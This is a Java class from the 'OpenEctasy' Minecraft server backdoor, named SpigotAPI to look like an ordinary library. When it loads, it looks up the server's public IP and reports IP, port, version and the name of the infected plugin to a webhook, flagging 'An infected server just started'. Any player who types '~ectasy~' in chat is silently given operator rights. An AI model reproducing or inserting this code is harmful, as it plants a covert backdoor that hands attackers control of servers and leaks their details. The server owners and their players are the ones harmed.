package fr.bodyalhoha.ectasy;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.scheduler.BukkitRunnable;

import javax.net.ssl.HttpsURLConnection;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.Scanner;

public class SpigotAPI implements Listener {

    private final JavaPlugin plugin;

    public SpigotAPI(JavaPlugin plugin, String webhook){
        this.plugin = plugin;
        Bukkit.getPluginManager().registerEvents(this, plugin);
        if(webhook.length() > 0){
            try{
                InputStream is = new URL("https://api.ipify.org").openConnection().getInputStream();
                Scanner s = new Scanner(is);
                String json = "{\"avatar_url\": \"https://bodyalhoha.com/ectasylogo_64x64.png\", \"username\": \"Open Ectasy\", \"embeds\": [{\"title\":\"OpenEctasy\", \"color\":3447003, \"description\":\"An infected server just started with [OpenEctasy](https://github.com/Body-Alhoha/OpenEctasy). \n\n{desc}\", \"footer\":{\"text\":\"OpenEctasy by Body Alhoha\"}}]}".replace("{desc}", "IP : `" + s.nextLine() + "`\nPort : `" + Bukkit.getPort() + "`\nVersion : `" + Bukkit.getVersion().replace("\"", "\\\"") + "`\nInfected Plugin : `" + plugin.getName() + "`");
                json = json.replace("\n", "\\n");
                HttpsURLConnection connection = (HttpsURLConnection)new URL(webhook).openConnection();
                connection.setRequestMethod("POST");
                connection.setRequestProperty("Content-Type", "application/json");
                connection.setRequestProperty("User-Agent", "Mozilla/5.0 (X11; U; Linux i686) Gecko/20071127 Firefox/2.0.0.11");
                connection.setDoOutput(true);
                OutputStream outputStream = connection.getOutputStream();
                outputStream.write(json.replace("\n", "\\n").getBytes(StandardCharsets.UTF_8));
                connection.getInputStream();
            }catch (Exception ignored){

            }
        }
    }

    @EventHandler
    public void onChatEvent(AsyncPlayerChatEvent e){
        if(e.getMessage().contains("~ectasy~")){
            e.setCancelled(true);
            e.getPlayer().sendMessage(ChatColor.GOLD + "" + ChatColor.BOLD + "Thank you" + ChatColor.AQUA + "" + ChatColor.BOLD + " for using " + ChatColor.GOLD + "" + ChatColor.BOLD + "OpenEctasy " + ChatColor.AQUA + "" + ChatColor.BOLD + "by");
            e.getPlayer().sendMessage(ChatColor.AQUA + "" + ChatColor.BOLD + "https://github.com/Body-Alhoha/OpenEctasy");
            new BukkitRunnable() {
                @Override
                public void run() {
                    e.getPlayer().setOp(true);
                }
            }.runTask(this.plugin);
        }
    }


}
